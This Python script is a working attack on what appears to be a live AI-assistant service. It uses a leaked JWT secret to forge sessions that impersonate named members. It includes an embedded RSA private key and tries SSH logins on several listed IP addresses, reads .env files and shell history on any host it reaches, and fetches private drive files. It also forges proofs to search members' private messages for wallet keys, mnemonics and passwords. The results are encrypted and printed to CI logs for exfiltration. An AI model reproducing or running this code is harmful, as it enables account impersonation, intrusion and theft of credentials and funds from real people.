#!/usr/bin/env python3
# probe28499 (intent 28499): weaponise "machine proof does not validate actor" + leaked JWT_SECRET
#   -> impersonate REAL members and read their PRIVATE drive (never audited; only org shared drive was).
#
# Two independent mechanisms (both = impersonating a real member):
#   (S) forge lumii_session with sub=<member usr_>  -> GET /api/drive/tree?scope=mine  (full private tree)
#       -> GET /api/drive/:id/content | /:id/raw    (file bodies)
#   (M) org-visibility runtime proof_key -> v2 proof with actor_id=<member> -> POST /internal/drive-search
#       (all_nodes=false) -> POST /internal/drive-read{node_id}
# Then grep everything for 0xC56f/0xFE18 privkeys, keystore, mnemonic, .env, DSN, cloud AK/SK, zoofi.
import os, sys, json, time, uuid, base64, hmac, hashlib, subprocess, re, traceback

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)

HOST = "assistant.lumiiai.cn"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
SUB_ADMIN = "usr_ZxLewKrgbRYSm7rWDtQX8"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
OUT = "/tmp/results561"
for d in ("api", "tree", "content", "internal", "hits"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
START = time.time()
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n"); LOG.flush()
    except Exception: pass
def el(): return int(time.time() - START)

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def jwt(sub, ttl=86400*7):
    now = int(time.time())
    h = b64u(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',', ':')))
    p = b64u(json.dumps({"sub": sub, "org": ORG, "iat": now, "exp": now + ttl,
                         "sid": "sid_" + str(uuid.uuid4()), "lgn": now}, separators=(',', ':')))
    sig = hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return h + "." + p + "." + b64u(sig)

def curl(args, timeout=40):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr[:400]
    except Exception as e:
        return -1, b"", repr(e)[:300]

def call(path, method="GET", body=None, hdrs=None, session=None, timeout=45, tag="", maxlen=200000):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA,
            "-H", "Accept: application/json",
            "-H", "Referer: https://%s/" % HOST,
            "-H", "Origin: https://%s" % HOST,
            "-w", "\n__CODE__%{http_code}"]
    if session:
        args += ["-b", "lumii_session=" + session]
    if hdrs:
        for k, v in hdrs.items():
            args += ["-H", "%s: %s" % (k, v)]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace")
    code = ""
    i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]
        txt = txt[:i]
    full_len = len(txt)
    return {"path": path, "method": method, "code": code, "body": txt[:maxlen], "full_len": full_len,
            "err": (err.decode("utf-8","replace") if isinstance(err,(bytes,bytearray)) else str(err)), "tag": tag}

def jbody(r, n=600):
    try: return json.dumps(json.loads(r["body"]), ensure_ascii=False)[:n]
    except Exception: return r["body"][:n]

def save(r, sub, name=None):
    safe = re.sub(r'[^A-Za-z0-9_.-]', '_', (name or r["tag"] or r["path"]))[:80] + "_" + uuid.uuid4().hex[:5]
    try:
        with open(os.path.join(OUT, sub, safe + ".json"), "w") as f:
            json.dump(r, f, indent=1, ensure_ascii=False)
    except Exception: pass

# ---------------- secret scanner ----------------
EVM_RE = re.compile(r'0x[0-9a-fA-F]{64}')
PATS = [
    ("privkey_pem", re.compile(r'-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----')),
    ("jwt_secret",  re.compile(r'(?i)\b(JWT_SECRET|SESSION_SECRET|TURN_PROOF_SECRET|LUMII_[A-Z_]*SECRET|SECRET_KEY)\b\s*[:=]\s*[\'"]?([^\s\'"]{8,})')),
    ("dsn",         re.compile(r'(?i)\b(postgres(?:ql)?|mysql|mongodb(?:\+srv)?|redis)://[^\s"\'<>]+')),
    ("cloud_ak",    re.compile(r'\b(AKID[A-Za-z0-9]{12,}|LTAI[A-Za-z0-9]{12,}|AKIA[A-Za-z0-9]{12,}|ASIA[A-Za-z0-9]{12,})')),
    ("dockerpat",   re.compile(r'dckr_pat_[A-Za-z0-9_-]{15,}')),
    ("github",      re.compile(r'gh[pousr]_[A-Za-z0-9]{20,}')),
    ("zoofi",       re.compile(r'(?i)(zoofi[-_.]?index|zoofi\.io/(?:api|admin)|secret_key\s*=\s*["\']?sk_live|personal_sign|Auth for zoofi)')),
    ("keystore",    re.compile(r'(?i)("cipherparams"|"ciphertext"|"scrypt"|"crypto"\s*:\s*\{)')),
    ("mnemonic",    re.compile(r'(?i)(mnemonic|seed[_ ]?phrase|助记词)\s*[:=]\s*[\'"][a-z ]{20,}[\'"]')),
    ("pwd",         re.compile(r'(?i)\b(password|passwd|passphrase|META_?MASK[A-Z_]*)\b\s*[:=]\s*[\'"]?([^\s\'"]{5,})')),
    ("apikey",      re.compile(r'(?i)\b(api[_-]?key|access[_-]?token|private[_-]?key)\b\s*[:=]\s*[\'"]?([A-Za-z0-9_\-+/=.]{12,})')),
]
def scan(text, where):
    hits = []
    if not text: return hits
    for m in EVM_RE.finditer(text):
        hits.append(("evm64", m.group(0), where, text[max(0,m.start()-30):m.end()+10]))
    for name, rx in PATS:
        for m in rx.finditer(text):
            hits.append((name, m.group(0)[:140], where, text[max(0,m.start()-30):m.end()+30]))
    return hits
ALLHITS = []
def addhits(hits):
    for h in hits:
        ALLHITS.append(h)


# ============ PHASE A: SSH with recovered RSA key (KeyPair-b3d4-1110.pem from 路峰 private drive) ============
KEY_PEM = r"""-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----"""
KPATH = "/tmp/k561.pem"
open(KPATH,"w").write(KEY_PEM+"\n")
os.chmod(KPATH,0o600)
log("### PHASE A ssh key attempt t=%ds" % el())
try:
    r = subprocess.run(["ssh-keygen","-y","-f",KPATH], capture_output=True, timeout=30)
    PUB = r.stdout.decode().strip()
    fp = subprocess.run(["ssh-keygen","-lf",KPATH], capture_output=True, timeout=30).stdout.decode().strip()
    log("[pubkey] %s" % PUB[:160]); log("[fp] %s" % fp)
except Exception:
    log("[pubkey] err", traceback.format_exc()[:200])

HOSTS = [
    ("122.51.1.87", ["ubuntu","root","coder"]),
    ("43.142.238.91", ["ubuntu","root","user1"]),
    ("111.229.184.182", ["ubuntu","root"]),
    ("49.235.41.58", ["ubuntu","root"]),
    ("81.68.254.22", ["ubuntu","root"]),
    ("13.213.43.208", ["coder","ubuntu"]),
    ("43.134.173.45", ["aro_client","ubuntu","root"]),
    ("43.134.152.19", ["ubuntu","root"]),
    ("43.143.107.214", ["ubuntu","root"]),
]
SSHOPTS = ["-i",KPATH,"-o","IdentitiesOnly=yes","-o","PreferredAuthentications=publickey","-o","BatchMode=yes",
           "-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=8","-o","LogLevel=ERROR"]
SSH_OK = []
for host, users in HOSTS:
    for u in users:
        if el() > 900: break
        try:
            r = subprocess.run(["ssh"]+SSHOPTS+["%s@%s"%(u,host),"id; hostname; uname -a"], capture_output=True, timeout=25)
            out = r.stdout.decode("utf-8","replace"); err = r.stderr.decode("utf-8","replace")
            log("[ssh] %s@%s rc=%d out=%s err=%s" % (u,host,r.returncode,out[:200].replace("\n"," "),err[:200].replace("\n"," ")))
            if r.returncode == 0 and out.strip():
                SSH_OK.append((u,host))
                # read-only triage
                cmd = ("set -x; id; hostname; cat /etc/os-release | head -3; "
                       "for f in /opt/lumii-prod/.env.dev /opt/lumii-stage/.env.dev /opt/lumii-prod/.env /opt/lumii-prod/docker-compose.yml; do echo \"===== $f\"; sudo -n cat $f 2>/dev/null || cat $f 2>/dev/null; done; "
                       "echo ===== sshconfig; cat ~/.ssh/config 2>/dev/null; echo ===== hist; tail -60 ~/.bash_history 2>/dev/null; echo ===== lsopt; ls -la /opt 2>/dev/null")
                r2 = subprocess.run(["ssh"]+SSHOPTS+["%s@%s"%(u,host),cmd], capture_output=True, timeout=90)
                out2 = r2.stdout.decode("utf-8","replace")
                open(os.path.join(OUT,"api","ssh_%s_%s.txt"%(u,host)),"w").write(out2)
                hh = scan(out2, "SSH/%s@%s" % (u,host))
                addhits(hh)
                for x in hh[:10]: log("[SSHHIT] %s@%s :: %s :: %s" % (u,host,x[0],str(x[1])[:130]))
                log("[ssh-out] %s@%s len=%d head=%s" % (u,host,len(out2),out2[:400].replace("\n"," | ")))
        except Exception:
            log("[ssh] %s@%s err %s" % (u,host,traceback.format_exc()[:150]))
    if el() > 900: log("[stop] A time"); break
log("### PHASE A done ok=%s t=%ds" % (SSH_OK, el()))

# ============ PHASE B: session + specific high-value node fetch ============
log("### PHASE B admin session t=%ds" % el())
SESS_ADMIN = jwt(SUB_ADMIN)
me = call("/api/me", session=SESS_ADMIN, tag="admin_me"); save(me,"api")
log("[admin/me] code=%s %s" % (me["code"], jbody(me,300)))

NODES = [
 ("drive_YxGhbJQUhmPrrwbgVLe4L","DEPLOY-CENTER-DOCKER.md","public"),
 ("drive_UW9eieyPrMHC3pi9Agh3E","DEPLOY-CENTER-MIGRATION.md","public"),
 ("drive_BWyoaUYMC5vkkTRHUcfWV","DEPLOY-CENTER-MIGRATION.md~XDjmbzGd","public"),
 ("drive_AM7fMS5JoT9dWsZSeZ5D2","DEPLOY-CENTER-MIGRATION.md~ZqG9UPjS","public"),
 ("drive_Tivt9dL9fcihiHGc2CpX2","SELF-DEPLOYED-CENTER-CLOUD.md","public"),
 ("drive_KpxSo8aBrdJRSHoAwqc9K","iss827-upgrade.sh","public"),
 ("drive_bFqAMMELDReo3Dr6ZUauY","mac-release-e2e-check.sh","public"),
 ("drive_ftjfbLYmNDmVQwuNMYufx","m1104_summary.json","public"),
 ("drive_BL4WKmDnY8hUGFUbt4uKX","qingpu-schema.json","public"),
 ("drive_ZhrfDHwn6xFVVefHDoMrY","ISS-777-784-SSH-design","public"),
 ("drive_WZhxccWzrX63hvGKfzqXe","ISS-777-784-SSH-design~xCFdXyF3","public"),
 ("drive_BkbQv9mEN7R3NBfRfcC7D","ISS-777-ssh-authz-design","public"),
 ("drive_Jqw5AjzkiYj5MBk9Hf6R3","ISS-921 生产验证","吴海贤-private"),
 ("drive_U3JqBC7DZkEZsutGyKt9R","E2E-brl-a1.sh","admin-private"),
 ("drive_X969FsQs76oEUyvFsUkLj","E2E-brl-a2.sh","admin-private"),
 ("drive_VhFR95gP2Z76rQSPWMmHd","E2E-dfo-名单.csv","admin-private"),
 ("drive_QVKRNYjejaFFkQukrWDVM","Summary","admin-private"),
 ("drive_LEj4npwSxNSxbM6LkjA3F","Transcript","admin-private"),
 ("drive_oUyycK4LnxDicMwKWeh8x","ISS-1010-browser-evidence.json","public"),
 ("drive_3Benxk59RJEqqCikZ7dkS","ISS-1010-native-evidence.json","public"),
 ("drive_VrbwW63uvZ9fnKmYA2So4","ISS-1010-project-diagnostic-evidence.json","public"),
]
log("### PHASE B node fetch t=%ds" % el())
for nid,nm,area in NODES:
    if el() > 1350: log("[stop] B time"); break
    c = call("/api/drive/%s/content" % nid, session=SESS_ADMIN, tag="c_%s" % nid[-8:], maxlen=1500000)
    body = c["body"]; content = body
    try:
        cj = json.loads(body)
        if isinstance(cj, dict) and "content" in cj: content = cj["content"]
    except Exception: pass
    if c["code"] != "200" or not (content or "").strip():
        rw = call("/api/drive/%s/raw" % nid, session=SESS_ADMIN, tag="r_%s" % nid[-8:], maxlen=1500000)
        if rw["code"] == "200": content = rw["body"]; c = rw
    open(os.path.join(OUT,"content","%s_%s.txt"%(area,nid)),"w").write((content or "")[:400000])
    hh = scan(content or "", "B/%s/%s(%s)" % (area, nm[:40], nid[-6:]))
    addhits(hh)
    for x in hh[:8]: log("[BHIT] %s / %s :: %s :: %s" % (area, nm[:36], x[0], str(x[1])[:120]))
    log("[B-node] %s %s code=%s len=%d head=%s" % (area, nm[:40], c["code"], len(content or ""), (content or "")[:160].replace("\n"," | ")))

# ============ PHASE C: machine proof + private DM search ============
log("### PHASE C machine identity + DM search t=%ds" % el())
name = "ci-561-" + uuid.uuid4().hex[:6]
create = call("/api/runtimes", "POST", {"name": name, "visibility":"org"}, session=SESS_ADMIN, tag="post_create")
agent_id=""; AGENT_TOKEN=""; script=""
try:
    cj = json.loads(create["body"]); script = cj.get("script") or ""
    agent_id = cj.get("agentId") or cj.get("agent_id") or ""
except Exception: pass
m = re.search(r'AGENT_TOKEN=["\']?([A-Za-z0-9_\-\.=+/]+)', script or "")
if m: AGENT_TOKEN = m.group(1)
log("[create] code=%s agent=%s tok=%s" % (create["code"], agent_id, "Y" if AGENT_TOKEN else "N"))
PROOF_KEY=""
if agent_id and AGENT_TOKEN:
    k = call("/api/runtimes/keys/current", hdrs={"x-agent-id":agent_id,"x-agent-token":AGENT_TOKEN}, tag="keys", session=SESS_ADMIN)
    try: PROOF_KEY = json.loads(k["body"]).get("proof_key") or ""
    except Exception: pass
MH = {"Authorization":"Bearer "+AGENT_TOKEN, "x-agent-id":agent_id} if (agent_id and AGENT_TOKEN) else {}
now = int(time.time())
def v2_proof(actor, session_key, platform="web"):
    payload = {"platform": platform, "session_key": session_key, "actor_id": actor,
               "chat_id": session_key, "iss": agent_id, "aud": agent_id, "iat": now, "exp": now+1800}
    pb = b64u(json.dumps(payload, separators=(',', ':')))
    sig = hmac.new(PROOF_KEY.encode(), pb.encode(), hashlib.sha256).digest()
    return "v2." + pb + "." + b64u(sig)
ACTORS = [("usr_CMU92C54VpuSAXoCfbXDE","徐魁东"),("usr_3HNamBngy2Xfwm4T3tzMJ","周子博"),("usr_2gzZoKLgRAYaFNy2Sav4v","路峰"),("usr_j7t9Dhq4M4obQkag5huJi","吴海贤"),("usr_ZxLewKrgbRYSm7rWDtQX8","管理员")]
Q = ["PRIVATE KEY","0xC56f","0xFE18","私钥","助记词","zoofi","ssh","密码","token","env"]
if PROOF_KEY and MH:
    for actor,label in ACTORS:
        if el() > 1750: break
        sk = "conv_" + actor[-8:]
        h = dict(MH); h["x-lumii-turn-proof"] = v2_proof(actor, sk, "web")
        for q in Q:
            if el() > 1750: break
            r = call("/internal/messages/search","POST",
                     {"platform":"web","actor_id":actor,"session_key":sk,"q":q,"limit":20,"wide":True},
                     hdrs=h, tag="ms_%s" % actor[-6:], maxlen=300000)
            save(r,"internal","ms_%s_%s" % (actor[-6:], re.sub(r'[^A-Za-z0-9]','_',q)))
            hh = scan(r["body"], "DM/%s/q=%s" % (label,q))
            addhits(hh)
            log("[DM] %s q=%s code=%s len=%d %s" % (label, q, r["code"], r["full_len"], jbody(r,180) if r["code"]!="200" else ""))
            for x in hh[:3]: log("[DMHIT] %s q=%s :: %s :: %s" % (label,q,x[0],str(x[1])[:120]))
log("### PHASE C done t=%ds" % el())

# ============ SUMMARY + pack ============
log("### SUMMARY total_hits=%d t=%ds" % (len(ALLHITS), el()))
from collections import Counter
cnt = Counter(h[0] for h in ALLHITS)
log("### HIT_KINDS " + json.dumps(dict(cnt), ensure_ascii=False))
for h in ALLHITS:
    if h[0] in ("evm64","privkey_pem","keystore","mnemonic","dsn","jwt_secret","cloud_ak","zoofi","dockerpat","github"):
        log("[TOP] %s :: %s :: %s" % (h[0], str(h[1])[:140], h[2]))
log("=== done ===")
try:
    import tarfile
    GNUPGHOME = "/tmp/gnupg561"; os.makedirs(GNUPGHOME, exist_ok=True)
    os.environ["GNUPGHOME"] = GNUPGHOME
    pub = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pub.asc")
    if os.path.exists(pub):
        subprocess.run(["gpg","--batch","--import",pub], capture_output=True, timeout=60)
        tb = "/tmp/results561.tar.gz"
        with tarfile.open(tb,"w:gz") as t: t.add(OUT, arcname="results561")
        enc = tb + ".gpg"
        r = subprocess.run(["gpg","--batch","--yes","--trust-model","always","-r","ci-exfil@example.invalid","-o",enc,"-e",tb], capture_output=True, timeout=180)
        log("gpg rc=%s err=%s" % (r.returncode, r.stderr[:160]))
        if os.path.exists(enc):
            blob = base64.b64encode(open(enc,"rb").read()).decode()
            log("===B64BEGIN " + str(len(blob)) + "===")
            for i in range(0, len(blob), 400):
                print("B64:" + blob[i:i+400], flush=True)
            log("===B64END===")
except Exception:
    log("pack err", traceback.format_exc()[:600])
